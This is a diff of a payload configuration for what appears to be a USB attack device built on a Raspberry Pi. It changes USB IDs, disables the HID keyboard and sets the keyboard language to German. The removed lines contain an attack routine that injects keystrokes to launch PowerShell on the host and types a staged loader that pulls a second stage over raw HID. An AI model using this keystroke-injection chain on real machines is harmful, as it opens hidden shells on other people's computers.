@@ -7,13 +7,13 @@
 # =============================
 # Make sure to change USB_PID if you enable different USB functionality in order
 # to force Windows to enumerate the device again
-USB_VID="0x1d6b"        # Vendor ID
-USB_PID="0x0137"        # Product ID
+USB_VID="0x1D6B"        # Vendor ID
+USB_PID="0x0237"        # Product ID
 
 USE_ECM=true            # if true CDC ECM will be enabled
 USE_RNDIS=true          # if true RNDIS will be enabled
-USE_HID=true            # if true HID (keyboard) will be enabled
-USE_RAWHID=true         # if true HID raw device will be enabled
+USE_HID=false            # if true HID (keyboard) will be enabled
+USE_RAWHID=false         # if true HID raw device will be enabled
 USE_UMS=false           # if true USB Mass Storage will be enabled
 
 # disable setting of static routes for all IPv4 addresses
@@ -23,44 +23,15 @@ ROUTE_SPOOF=false
 USE_HID_TEST=true
 
 # overwrite keyboard language from setup.cfg
-lang="us" 
+lang="de" 
 
 # blink one time when payload script get's initiated
 led_blink 1 # usage at thi point is invalid, as the script gets called again on SSH login
-
-function onKeyboardUp()
-{
-
-
-	# start HID Server
-	screen -dmS hidsrv bash -c "cd $wdir/hidtools/frontdoor; python hidserver.py"
-
-	# blink two times when hid keyboard is usable and HID server is started
-	led_blink 2
-
-	while $true; do
-		# wait for keyboard LED trigger
-		key_trigger
-	
-		# run interactive PowerShell console
-		cat <<- EOF | duckhid
-			GUI r
-			DELAY 500
-			STRING powershell.exe
-			ENTER
-			DELAY 1000
-EOF
-
-		# output stage1 command (loads stage2 via raw HID)
-		cat $wdir/hidtools/frontdoor/stage1_mini.ps1 | outhid
-	done
-}
 
 
 # commands in this function are ran on user login
 # the commans are ran by user "pi"
 function onLogin()
 {
-	#sudo screen -d -r
 	return
 }
